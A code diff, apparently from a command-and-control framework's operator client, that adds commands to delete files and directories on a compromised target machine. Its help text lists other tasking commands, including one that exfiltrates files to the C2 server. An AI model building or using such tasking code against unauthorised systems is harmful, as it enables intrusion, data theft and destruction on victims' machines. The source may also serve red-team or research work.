@@ -172,6 +172,43 @@ pub async fn move_file(
     Ok(())
 }
 
+#[derive(Copy, Clone)]
+pub enum FileOperationTarget {
+    Dir,
+    File,
+}
+
+pub async fn remove_file(
+    raw_input: String,
+    target: FileOperationTarget,
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+    let target_path = match split_string_slices_to_n(1, &raw_input, DiscardFirst::Chop) {
+        Some(mut inner) => {
+            let target_path = take(&mut inner[0]);
+            target_path
+        }
+        None => {
+            return Err(TaskDispatchError::BadTokens(
+                "Could not get data from tokens in move_file.".into(),
+            ));
+        }
+    };
+
+    match target {
+        FileOperationTarget::Dir => {
+            api_request(AdminCommand::RmDir(target_path), agent, creds, None).await?;
+        }
+        FileOperationTarget::File => {
+            api_request(AdminCommand::RmFile(target_path), agent, creds, None).await?;
+        }
+    }
+
+    Ok(())
+}
+
 /// Pull a single file from the target machine
 pub async fn pull_file(
     target: String,
@@ -367,6 +404,8 @@ pub async fn show_help(
         "ls".into(),
         "cp <from> <to> | copy <from> <to> (accepts relative or absolute paths)".into(),
         "mv <from> <to> | move <from> <to> (accepts relative or absolute paths)".into(),
+        "rm <path to file> (removes file [this command cannot remove a directory] - accepts relative or absolute paths)".into(),
+        "rm_d <path to dir> (removes directory - accepts relative or absolute paths)".into(),
         "pull <path> (Exfiltrates a file to the C2. For more info, type help pull.)".into(),
         "pillage".into(),
         "run".into(),
